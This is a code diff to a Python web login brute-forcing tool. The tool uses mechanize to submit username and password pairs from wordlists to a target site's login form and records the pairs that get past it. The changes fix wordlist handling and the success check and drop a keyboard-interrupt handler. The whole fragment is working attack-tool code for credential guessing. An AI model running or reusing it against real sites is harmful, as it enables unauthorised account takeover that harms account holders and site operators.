@@ -40,7 +40,7 @@ class BruteForcing(object):
 		self.frmPassField = ''
 		self.lstUsername = optUsrList
 		self.lstPassword = optPassList
-		self.szPassword = actions.subaction_countListSize(self.lstPassword)
+		self.szPassword = actions.subaction_countListSize(self.lstPassword.readlines())
 		self.fndData = []
 		self.actTestConnection()
 
@@ -52,7 +52,7 @@ class BruteForcing(object):
 		try:
 			process.open(self.varTargetURL)
 			utils.printf("Connected to URL. Gathering login form information...\n", "good")
-			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
+			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_testFormInformation(process.forms())
 			process.close()
 		except mechanize.HTTPError as error:
 			sys.exit(utils.craft_msg(error, "bad"))
@@ -72,6 +72,7 @@ class BruteForcing(object):
 			proc.set_handle_robots(False)
 			proc.open(self.varTargetURL)
 
+			self.lstPassword.seek(0)
 			for idxPasswd in self.lstPassword:
 				idxPasswd = idxPasswd.replace('\n', '')
 
@@ -82,19 +83,14 @@ class BruteForcing(object):
 					count += 1
 					utils.prints("%10s : %20s%12s%10s / %10s" %(idxUsername, idxPasswd, '=' * 6, count, self.szPassword))
 					req = proc.submit()
-					try:
-						proc.reload()
-						proc.select_form(nr = self.frmLoginID)
-					except mechanize._mechanize.FormNotFoundError:
+					proc.reload()
+					if not actions.action_getFormInformation(proc.forms()):
 						utils.printf("Found: %s:%s" %(idxUsername, idxPasswd), "good")
 						self.fndData.append([idxUsername, idxPasswd])
 						break
 
 				except mechanize.HTTPError as error:
 					sys.exit(utils.craf_msg(error, "bad"))
-
-				except KeyboardInterrupt:
-					sys.exit(utils.craft_msg("Terminated!!!", "bad"))
 
 			if count == self.szPassword:
 				utils.printf("%s: No match found." %(idxUsername), "bad")
